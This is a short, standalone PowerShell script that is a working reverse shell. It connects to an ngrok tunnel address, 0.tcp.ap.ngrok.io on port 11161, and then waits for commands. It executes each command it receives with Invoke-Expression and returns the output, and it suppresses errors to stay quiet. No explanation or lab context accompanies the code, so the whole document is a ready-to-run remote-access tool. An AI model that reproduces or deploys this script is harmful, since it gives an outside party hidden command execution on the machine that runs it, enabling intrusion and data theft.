$ErrorActionPreference = 'SilentlyContinue'

$h = '0.tcp.ap.ngrok.io'
$p = 11161

try {
    $client = New-Object System.Net.Sockets.TcpClient($h, $p)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    $writer.WriteLine("Connected to $($h):$($p)")

    while ($true) {
        $command = $reader.ReadLine()
        if ([string]::IsNullOrWhiteSpace($command)) { continue }
        if ($command -eq 'exit') { break }

        $result = try {
            Invoke-Expression $command 2>&1 | Out-String
        } catch {
            $_.Exception.Message
        }

        $writer.WriteLine($result)
        $writer.Write("PS> ")
    }

    $client.Close()
} catch {
    $_.Exception.Message
}
